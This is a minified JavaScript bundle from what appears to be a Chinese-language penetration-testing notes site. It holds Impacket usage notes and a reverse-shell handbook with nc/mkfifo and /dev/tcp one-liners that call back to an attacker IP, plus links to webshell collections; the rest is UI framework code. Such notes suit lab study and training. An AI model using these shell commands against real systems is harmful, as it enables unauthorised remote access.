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"},"2jYT":function(H,d,n){"use strict";n.r(d),n.d(d,"Impacket_\u5957\u4EF6_Helper",function(){return m}),n.d(d,"Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C",function(){return F});var S=n("fWQN"),t=n("q1tI"),l=n.n(t),r=n("ysNt"),e=n("jJ7j"),u=r.l.singleATag_blank,m=function p(){Object(S.a)(this,p)};m.\u73AF\u5883\u51C6\u5907=`
      \u73AF\u5883\u51C6\u5907
          \u8FDB\u5165\u300Aimpacket\u300B\u6839\u76EE\u5F55\uFF0C\u8FD0\u884C\u300Apython3 -m pip install .\u300B
          \u811A\u672C\u5730\u5740\uFF1A
              \u300A/home/htb-hanshou101/Downloads/impacket/examples/<\u5177\u4F53\u54EA\u5757>\u300B
  `,m["mssqlclient.py"]=`

`.concat(m.\u73AF\u5883\u51C6\u5907,`

      \u4F7F\u7528
          \u67E5\u770B\u5E2E\u52A9
              python3  mssqlclient.py  --help

          \u767B\u5F55
              \u624B\u52A8\u4E8C\u6B21\u8F93\u5165\u5BC6\u7801
                  \u4E00\u822C\u60C5\u51B5
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>@<IP\u5730\u5740>

                  \u5E26Windows\u51ED\u8BC1
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>@<IP\u5730\u5740>  -windows-auth

              \u5BC6\u7801\u660E\u6587\u76F4\u63A5\u7528
                  \u4E00\u822C\u60C5\u51B5
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>:<\u7528\u6237\u5BC6\u7801>@<IP\u5730\u5740>

                  \u5E26Windows\u51ED\u8BC1
                      python3  mssqlclient.py  <\u57DF>/<\u7528\u6237\u540D>:<\u7528\u6237\u5BC6\u7801>@<IP\u5730\u5740>  -windows-auth


          \u5E38\u89C1\u9009\u9879\uFF1A
              \u3010-windows-auth\u3011\uFF0C
                  123

          \u589E\u5F3A\u547D\u4EE4\u6267\u884C        \uFF08\u5728\u3010mssql\u539F\u6709\u547D\u4EE4\u3011\u7684\u57FA\u7840\u4E0A\uFF0C\u505A\u4E86\u589E\u5F3A\uFF09

              help\uFF0C\u67E5\u770B\u5E2E\u52A9

              lcd  <\u8DEF\u5F84>
                  \u6539\u53D8\u3010\u771F\u673A\u3011\u7684\u8DEF\u5F84

              ! <\u5177\u4F53\u547D\u4EE4>
                  \u5728\u3010\u771F\u673A\u3011\u6267\u884C\u547D\u4EE4

              enable_xp_cmdshell\uFF0C\u5F00\u542F

              disable_xp_cmdshell\uFF0C\u5173\u95ED

              xp_cmdshell  <\u5177\u4F53\u547D\u4EE4>
                  \u6267\u884C\u547D\u4EE4

              sp_start_job  <\u5177\u4F53\u547D\u4EE4>
                  \u4F7F\u7528\u3010the sql server agent (blind)\u3011\uFF0C\u6267\u884C\u547D\u4EE4


  `),m["psexec.py"]=`

`.concat(m.\u73AF\u5883\u51C6\u5907,`

      \u4F7F\u7528\uFF1A

          \u80FD\u591F\u4F5C\u4E3A\u3010administrator\u3011\uFF0C\u83B7\u5F97 shell
              \u9700\u8981\u63D0\u524D \u5F97\u5230\u3010\u7BA1\u7406\u5458\u5BC6\u7801\u3011
              \u5229\u7528\u4E86\u3010writable share ADMIN$\u3011\u3001\u3010Uploading file pGRORiNg.exe\u3011\u3001\u3010SVCManager\u3011\u3001\u3010service yYxC\u3011\u3001\u3010Press help for extra shell\u3011\u3002

          \u5C5E\u4E8E\u3010Impacket\u3011\u5957\u4EF6\u3002

          \u8FD0\u884C
              python3  psexec.py  <\u7528\u6237\u540D_\u5982administrator>@<\u76EE\u6807IP>
                  \u4E4B\u540E\uFF0C\u9700\u8981 \u8F93\u5165 \u5BC6\u7801


          `),m.get_\u548C_lget=`

`.concat(m.\u73AF\u5883\u51C6\u5907,`

              \u65E7\u7248\u7528\u3010get\u3011

              \u65B0\u7248\u7528\u3010lget\u3011

  `),m.GetNPUsers=`


  `,m["smbserver.py"]=`

              \u5C06\u4F1A\u5728\u672C\u673A\uFF0C\u5FEB\u901F\u542F\u52A8\u4E00\u4E2A\u3010SMB\u670D\u52A1\u3011\uFF1B\u4EE5\u63D0\u4F9B\u7ED9\u5176\u5B83\u673A\u5668\uFF0C\u8FDB\u884C\u8BFB\u53D6\u3002

              python3  smbserver.py -smb2support -username  <\u7528\u6237\u540D\u5982guest>  -password  <\u5BC6\u7801\u5982guest>  share  /root/htb


  `,m["lookupsid.py"]=`
              python3  lookupsid.py  <\u7528\u6237\u540D>:<\u5BC6\u7801>@<IP\u5730\u5740>
  `;var E={name:"\u3010Shell\u3011_\u3010ReverseShell\u3011_\u3010\u53CD\u5411\u4EE3\u7406\u3011_\u624B\u518C",steps:[{name:"\u300A\u6E05\u5355\u300B\u2014\u2014\u5E38\u89C1\u3010\u53CD\u5411\u4EE3\u7406\u3011\uFF0C\u5927\u5168\u6536\u96C6",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u53EF\u80FD\u662F\u4E16\u754C\u4E0A\uFF0C\u6700\u5168\u7684\u4E00\u4EFD Reverse Shell \u53CD\u5411\u4EE3\u7406\uFF0Cdemo\u6E05\u5355\uFF1A
              PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master \xB7 swisskyrepo/PayloadsAllTheThings
                  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

          \u53E6\u5916\u4E00\u4EFD\uFF0C\u4E5F\u6781\u4E3A\u4E30\u5BCC\u7684\uFF0Cshell\u6E05\u5355\uFF1A\uFF08\u4F3C\u4E4E\u662F\u56FD\u4EBA\uFF0C\u5728\u7EF4\u62A4\u7684\uFF09
              tennc/webshell
                  https://github.com/tennc/webshell

          \u4E00\u4E9B\u96F6\u661F\u7684\u811A\u672C\u6536\u96C6\uFF1A
              \u3010PowerShell\u3011\u7684shell\u811A\u672C\uFF1A
                  Nishang\u63D0\u4F9B\u7684\u4E00\u4E2A\uFF1Ahttps://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

          HTB_\u63D0\u4F9BWebShell
              "/usr/share/webshells"

                  /php                                              \uFF08PHP\uFF09
                      /php-reverse-shell.php


          `))},{name:"\u3010\u4E00\u53E5\u8BDD\u6728\u9A6C\u3011/\u3010\u5C0F\u9A6C\u3011/\u3010\u5927\u9A6C\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              \u4E00\u53E5\u8BDD\u6728\u9A6C
                  \u5404\u79CD\u8BED\u8A00\u7684\u3010\u4E00\u53E5\u8BDD\u6728\u9A6C/shell\u3011
                      [Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

                  \u6BD4\u5982\u4E00\u4E9B\u3010\u751F\u50FB\u3011\u7684
                      \u3010rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <\u653B\u51FB\u673AIP> <\u653B\u51FB\u673A\u6B63\u76D1\u542C\u7AEF\u53E3> >/tmp/f\u3011
                          \u5728\u8FD9\u4E2A\u5217\u8868\u91CC\u9762\uFF0C\u4E5F\u6709\u3002
                          \u5DE5\u4F5C\u539F\u7406\uFF1A
                              \u300Ahttps://unix.stackexchange.com/questions/406683/how-does-this-command-work-mkfifo-tmp-f-cat-tmp-f-bin-sh-i-21-nc-l\u300B


              \u5C0F\u9A6C

                  \u6536\u96C6\u5217\u8868\uFF1A
                      \u7B2C\u4E00\u4E2A\uFF1Ahttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


              \u5927\u9A6C



              \u63D0\u5347\u529F\u80FDshell
                  \u89C1\u3010\u63D0\u5347 \u529F\u80FDshell\u3011


          `))},{name:"\u63D0\u5347 \u3010\u529F\u80FDshell\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u529F\u80FDshell

              \u4ECB\u7ECD\uFF1A
                  \u6BD4\u3010netcat\u3001nc\u3011\u53EF\u80FD\u66F4\u5177\u5F3A\u5927\u529F\u80FD
                      \u6BD4\u5982\u3010\u547D\u4EE4\u63D0\u793A\u3011\u3001\u3010\u5386\u53F2\u8BB0\u5F55\u3011\uFF0C\u7B49
                      \u6BD4\u5982\u3010vi\u3011\u7F16\u8F91
                      \u6BD4\u5982\u3010su\u3011\u547D\u4EE4
                      \u6BD4\u5982\u3010Ctrl+C\u3011\u4EC5\u9000\u51FA\u6700\u4E0A\u4E00\u5C42

          \u5E38\u89C1\u8BED\u53E5

              python3 -c 'import pty;pty.spawn("/bin/bash")'
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5728\u3010netcat\u3001nc\u3011\u8FDE\u63A5\u4E0A\uFF0C\u4E4B\u540E\u8FD0\u884C

              bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5728\u3010sqlmap \u7684 os-shell\u3011\u4E4B\u540E\u3002

                  \u9700\u8981\u914D\u5408\u7684\uFF1A
                      \u5728\u672C\u5730\uFF0C\u542F\u52A8\u4E00\u4E2A\u3010nc\u76D1\u542C\u3011

              script  /dev/null  -c  bash
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5229\u7528\u3010log4j\u6F0F\u6D1E \u2014\u2014 RogueJndi/rogue-jndi\u3011\uFF0C\u5229\u7528\u3010jndi:ldap\u3011\u6240\u8FD4\u56DE\u7684\u3010shell\u3011\u4E2D

              \u66F4\u9AD8\u7EA7\u7684\uFF1A
                  \u5B8C\u5168\u4F53\u4EA4\u4E92
                      \u7B2C\u4E00\u6B65\uFF0C\u3010python3 -c 'import pty;pty.spawn("/bin/bash")'\u3011
                      \u7B2C\u4E8C\u6B65\uFF0C\u8F93\u5165\u3010CTRL+Z\u3011
                      \u7B2C\u4E09\u6B65\uFF0C\u8F93\u5165\u3010stty raw -echo\u3011
                      \u7B2C\u56DB\u6B65\uFF0C\u8F93\u5165\u3010fg\u3011
                          1.
                      \u7B2C\u4E94\u6B65\uFF0C\u8F93\u5165\u3010export TERM=xterm\u3011
                          1. \u6CE8\u610F\uFF0C\u5728\u8F93\u5165\u4E4B\u524D\uFF0C\u53EF\u80FD\u754C\u9762\u663E\u793A\u6709\u70B9\u5947\u602A\uFF1B\u4F46\u4E0D\u7528\u62C5\u5FC3

          `))},{name:"\u3010netcat\u3011 / \u3010nc\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u4F7F\u7528\u65B9\u6CD5\uFF08\u901A\u7528\uFF09",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          netcat
              \u8FDE\u63A5TCP

              \u8FDE\u63A5UDP



          \u63A5\u6536\u65B9

              \u57FA\u672C\u4F7F\u7528\uFF1A
                  \u67E5\u770B\u5E2E\u52A9
                      nc  -h

                  \u542F\u52A8\u76D1\u542C
                      nc  -lvnp  <\u7AEF\u53E3>

              \u5E38\u89C1\u9009\u9879
                  \u300A-l\u300B\uFF0C\u76D1\u542C\u6A21\u5F0F
                  \u300A-v\u300B\uFF0C\u663E\u793A\u65E5\u5FD7
                  \u300A-n\u300B\uFF0C\u4F7F\u7528\u3010\u7EAF\u6570\u5B57IP\u5730\u5740\u3011\u3001\u4E0D\u4F7F\u7528\u3010\u4E3B\u673A\u540Dhostname\u89E3\u6790\u3011
                  \u300A-p\u300B\uFF0C\u6307\u5B9A\u76D1\u542C\u7AEF\u53E3

                  \u300A-u\u300B\uFF0C\u4F7F\u7528 UDP\u6A21\u5F0F

          \u53D1\u9001\u65B9

              123


          `))},{name:"Linux\u7248 netcat",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              `))},{name:"Windows\u7248 netcat",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u3010nc.exe\u3011\u4E0B\u8F7D\u5730\u5740\uFF1A
                  \u7F51\u9875\u9875\u9762\uFF1Ahttps://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
                  exe\u4E0B\u8F7D\u5730\u5740\uFF1Ahttps://github.com/int0x33/nc.exe/raw/master/nc64.exe

              `))}]},{name:"\u3010psexec\u3011 / \u3010psexec.py\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(m["psexec.py"]))},{name:"\u3010evil-winrm\u3011 / \u3010EvilWinrm\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,e.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1Ahttps://github.com/Hackplayers/evil-winrm

          \u517C\u5BB9 Linux \u548C Windows \u5BA2\u6237\u7AEF\u7CFB\u7EDF

          `))}]},F=E},3:function(H,d){},4:function(H,d){},5:function(H,d){},"550Q":function(H,d,n){"use strict";n.d(d,"a",function(){return O});var S=n("Mwp2"),t=n("VXEj"),l=n("k1fw"),r=n("tU7J"),e=n("wFql"),u=n("q1tI"),m=n.n(u),E=n("yvwo"),F=n.n(E),p=n("ysNt"),I=n("thHx"),g=n.n(I),c=function(b){var y=b.children;return m.a.createElement("span",{className:g.a.circleSketchHighlight,style:{fontSize:"40px"}},y)},h=n("Pvr8"),w=p.l.getHighlightedText,a={\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C:"nowrap"};function B(_){return p.l.check_isString(_)?m.a.createElement("pre",null,_):_}var O=function(b){var y=b.\u5019\u9009_BeanArr,j=b.\u9009\u4E2D\u5173\u952E\u5B57_arr_\u53EF\u4EE5\u4F9B\u9AD8\u4EAE;return m.a.createElement(m.a.Fragment,null,m.a.createElement(t.b,{bordered:!0,dataSource:y,renderItem:function(x){return m.a.createElement(t.b.Item,{style:{display:"flex",flexDirection:"column",alignItems:"flex-start"}},m.a.createElement("div",{style:{width:"100%",display:"flex",justifyContent:"space-between",alignItems:"flex-start"}},m.a.createElement("div",{style:{display:"flex",whiteSpace:a.\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C}},m.a.createElement(e.a.Text,{mark:!0},"[\u5EFA\u8BAE]"),m.a.createElement("span",{style:{marginLeft:"3px",whiteSpace:a.\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C}},x.keyWCfg.desc)),function(){var T;if(j&&j.length>0){var R=w(x.keyWCfg.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.toString(),j);T=R.map(function(s){return s.isEqual?m.a.createElement(c,null,s.part):m.a.createElement(m.a.Fragment,null,s.part)})}else T=x.keyWCfg.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.toString();return m.a.createElement("span",{style:{fontSize:"12px"}},T)}()),m.a.createElement(h.a,{orientation:"left",type:"A"}),function(){var T=!!x.keyWCfg.\u76F8\u5173\u7EC4\u4EF6&&x.keyWCfg.\u76F8\u5173\u7EC4\u4EF6.length>0,R=T?{display:"flex",flexDirection:"row",justifyContent:"space-between"}:{display:"flex",flexDirection:"column"},s={flex:"1 0 0"};return m.a.createElement("div",{style:Object(l.a)({width:"100%"},R)},m.a.createElement("ol",{className:F.a.koanList,style:Object(l.a)({},s)},function(){var o=x.keyWCfg.koans_\u63D0\u793A,i=Array.isArray(o)?o.map(function(f){return m.a.createElement("li",null,B(f))}):m.a.createElement("li",null,B(o));return i}()),T&&m.a.createElement("div",{style:Object(l.a)({display:"flex",flexDirection:"row",flexWrap:"wrap",alignItems:"flex-start",gap:"0.1em",width:"100%",height:"fit-content"},s)},x.keyWCfg.\u76F8\u5173\u7EC4\u4EF6))}(),m.a.createElement(h.a,{orientation:"right",style:{marginTop:"7.5em"},type:"C",widthPx:75*3,coverPosition:171}))}}))}},"5rEg":function(H,d,n){"use strict";var S=n("mh/l"),t=n("rePB"),l=n("q1tI"),r=n("TSYQ"),e=n.n(r),u=n("H84U"),m=function(i){return l.createElement(u.a,null,function(f){var P,D=f.getPrefixCls,C=f.direction,M=i.prefixCls,L=i.className,J=L===void 0?"":L,q=D("input-group",M),V=e()(q,(P={},Object(t.a)(P,"".concat(q,"-lg"),i.size==="large"),Object(t.a)(P,"".concat(q,"-sm"),i.size==="small"),Object(t.a)(P,"".concat(q,"-compact"),i.compact),Object(t.a)(P,"".concat(q,"-rtl"),C==="rtl"),P),J);return l.createElement("span",{className:V,style:i.style,onMouseEnter:i.onMouseEnter,onMouseLeave:i.onMouseLeave,onFocus:i.onFocus,onBlur:i.onBlur},i.children)})},E=m,F=n("wx14"),p=n("c+Xe"),I=n("l+S1"),g=n("2/Rp"),c=n("3Nzz"),h=n("0n0R"),w=function(o,i){var f={};for(var P in o)Object.prototype.hasOwnProperty.call(o,P)&&i.indexOf(P)<0&&(f[P]=o[P]);if(o!=null&&typeof Object.getOwnPropertySymbols=="function")for(var D=0,P=Object.getOwnPropertySymbols(o);D<P.length;D++)i.indexOf(P[D])<0&&Object.prototype.propertyIsEnumerable.call(o,P[D])&&(f[P[D]]=o[P[D]]);return f},a=l.forwardRef(function(o,i){var f,P=o.prefixCls,D=o.inputPrefixCls,C=o.className,M=o.size,L=o.suffix,J=o.enterButton,q=J===void 0?!1:J,V=o.addonAfter,tu=o.loading,Y=o.disabled,au=o.onSearch,hu=o.onChange,mu=w(o,["prefixCls","inputPrefixCls","className","size","suffix","enterButton","addonAfter","loading","disabled","onSearch","onChange"]),Pu=l.useContext(u.b),qu=Pu.getPrefixCls,Qu=Pu.direction,Wu=l.useContext(c.b),U=M||Wu,Fu=l.useRef(null),ru=function(Uu){Uu&&Uu.target&&Uu.type==="click"&&au&&au(Uu.target.value,Uu),hu&&hu(Uu)},Eu=function(Uu){var A;document.activeElement===((A=Fu.current)===null||A===void 0?void 0:A.input)&&Uu.preventDefault()},eu=function(Uu){var A;au&&au((A=Fu.current)===null||A===void 0?void 0:A.input.value,Uu)},su=qu("input-search",P),gu=qu("input",D),Yu=typeof q=="boolean"?l.createElement(I.a,null):null,Ee="".concat(su,"-button"),Hu,Su=q||{},oe=Su.type&&Su.type.__ANT_BUTTON===!0;oe||Su.type==="button"?Hu=Object(h.a)(Su,Object(F.a)({onMouseDown:Eu,onClick:function(Uu){var A,W;(W=(A=Su==null?void 0:Su.props)===null||A===void 0?void 0:A.onClick)===null||W===void 0||W.call(A,Uu),eu(Uu)},key:"enterButton"},oe?{className:Ee,size:U}:{})):Hu=l.createElement(g.a,{className:Ee,type:q?"primary":void 0,size:U,disabled:Y,key:"enterButton",onMouseDown:Eu,onClick:eu,loading:tu,icon:Yu},q),V&&(Hu=[Hu,Object(h.a)(V,{key:"addonAfter"})]);var re=e()(su,(f={},Object(t.a)(f,"".concat(su,"-rtl"),Qu==="rtl"),Object(t.a)(f,"".concat(su,"-").concat(U),!!U),Object(t.a)(f,"".concat(su,"-with-button"),!!q),f),C);return l.createElement(S.a,Object(F.a)({ref:Object(p.a)(Fu,i),onPressEnter:eu},mu,{size:U,prefixCls:gu,addonAfter:Hu,suffix:L,onChange:ru,className:re,disabled:Y}))});a.displayName="Search";var B=a,O=n("whJP"),_=n("ODXe"),b=n("bT9E"),y=n("9BLJ"),j=n("fHMl"),v=function(o,i){var f={};for(var P in o)Object.prototype.hasOwnProperty.call(o,P)&&i.indexOf(P)<0&&(f[P]=o[P]);if(o!=null&&typeof Object.getOwnPropertySymbols=="function")for(var D=0,P=Object.getOwnPropertySymbols(o);D<P.length;D++)i.indexOf(P[D])<0&&Object.prototype.propertyIsEnumerable.call(o,P[D])&&(f[P[D]]=o[P[D]]);return f},x={click:"onClick",hover:"onMouseOver"},T=l.forwardRef(function(o,i){var f=Object(l.useState)(!1),P=Object(_.a)(f,2),D=P[0],C=P[1],M=function(){var V=o.disabled;V||C(!D)},L=function(V){var tu,Y=o.action,au=o.iconRender,hu=au===void 0?function(){return null}:au,mu=x[Y]||"",Pu=hu(D),qu=(tu={},Object(t.a)(tu,mu,M),Object(t.a)(tu,"className","".concat(V,"-icon")),Object(t.a)(tu,"key","passwordIcon"),Object(t.a)(tu,"onMouseDown",function(Wu){Wu.preventDefault()}),Object(t.a)(tu,"onMouseUp",function(Wu){Wu.preventDefault()}),tu);return l.cloneElement(l.isValidElement(Pu)?Pu:l.createElement("span",null,Pu),qu)},J=function(V){var tu=V.getPrefixCls,Y=o.className,au=o.prefixCls,hu=o.inputPrefixCls,mu=o.size,Pu=o.visibilityToggle,qu=v(o,["className","prefixCls","inputPrefixCls","size","visibilityToggle"]),Qu=tu("input",hu),Wu=tu("input-password",au),U=Pu&&L(Wu),Fu=e()(Wu,Y,Object(t.a)({},"".concat(Wu,"-").concat(mu),!!mu)),ru=Object(F.a)(Object(F.a)({},Object(b.a)(qu,["suffix","iconRender"])),{type:D?"text":"password",className:Fu,prefixCls:Qu,suffix:U});return mu&&(ru.size=mu),l.createElement(S.a,Object(F.a)({ref:i},ru))};return l.createElement(u.a,null,J)});T.defaultProps={action:"click",visibilityToggle:!0,iconRender:function(i){return i?l.createElement(y.a,null):l.createElement(j.a,null)}},T.displayName="Password";var R=T;S.a.Group=E,S.a.Search=B,S.a.TextArea=O.a,S.a.Password=R;var s=d.a=S.a},"6CFD":function(H,d,n){"use strict";n.d(d,"c",function(){return p}),n.d(d,"a",function(){return h}),n.d(d,"b",function(){return o});var S=n("mtLc"),t=n("fWQN"),l=n("+BJd"),r=n("mr32"),e=n("q1tI"),u=n.n(e),m=n("ysNt"),E=m.l.singleATag_blank;function F(i){return u.a.createElement(r.a,{color:"magenta"},i)}var p;(function(i){i.\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6="\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6",i.\u653E\u5230\u6700\u540E\u8003\u8651="\u653E\u5230\u6700\u540E\u8003\u8651",i.\u5F85\u6574\u7406\u7684\u5DE5\u5177="\u5F85\u6574\u7406\u7684\u5DE5\u5177",i.\u8303\u56F4\u9605\u8BFB="\u8303\u56F4\u9605\u8BFB",i.\u4F18\u5148\u63A8\u8350\u4F7F\u7528="\u4F18\u5148\u63A8\u8350\u4F7F\u7528",i.\u4F01\u4E1A\u516C\u53F8\u5185\u90E8="\u4F01\u4E1A\u516C\u53F8\u5185\u90E8",i.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145="\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145",i.\u6392\u5934\u5175="\u6392\u5934\u5175",i["\u8FD9\u662F\u6211\u5FFD\u89C6\u7684\uFF0C\u5F88\u91CD\u8981\u7684\u4E00\u70B9"]="\u8FD9\u662F\u6211\u5FFD\u89C6\u7684\uFF0C\u5F88\u91CD\u8981\u7684\u4E00\u70B9",i.\u5BF9\u7167\u7684\u5E95\u677F="\u5BF9\u7167\u7684\u5E95\u677F"})(p||(p={}));var I;(function(i){i["\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]="\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3",i["\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA 